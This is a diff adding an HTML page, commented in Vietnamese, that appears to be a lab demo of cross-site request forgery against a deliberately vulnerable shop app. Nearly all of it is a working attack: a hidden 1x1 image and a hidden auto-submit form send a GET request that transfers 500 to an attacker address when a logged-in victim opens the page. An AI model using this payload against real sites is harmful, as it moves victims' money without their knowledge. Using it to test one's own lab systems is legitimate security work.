@@ -1,0 +1,35 @@
+<!doctype html>
+<html>
+  <head>
+    <title>CSRF demo (#9)</title>
+    <style>
+      body { background: #0d1117; color: #e6edf3; font-family: system-ui; padding: 20px; }
+    </style>
+  </head>
+  <body>
+    <h1>CSRF demo (#9)</h1>
+    <p>
+      Điều kiện: nạn nhân đang login legacy session (cookie <code>session</code> với <code>SameSite=None</code>,
+      không có CSRF token). Mở trang này khi đã login → request tự động chuyển tiền.
+    </p>
+
+    <!-- 1) CSRF bằng GET (img src) - state-changing endpoint qua GET -->
+    <img
+      src="/api/orders/transfer?to=attacker@vulnshop.local&amount=500"
+      width="1"
+      height="1"
+      alt=""
+    />
+
+    <!-- 2) CSRF bằng form auto-submit -->
+    <form id="csrf" action="/api/orders/transfer" method="GET">
+      <input type="hidden" name="to" value="attacker@vulnshop.local" />
+      <input type="hidden" name="amount" value="500" />
+    </form>
+    <script>
+      // tạm comment dòng dưới nếu không muốn auto chạy khi mở trang
+      // document.getElementById("csrf").submit();
+    </script>
+    <p>Đã bắn request GET ẩn ở trên — kiểm tra balance của nạn nhân.</p>
+  </body>
+</html>
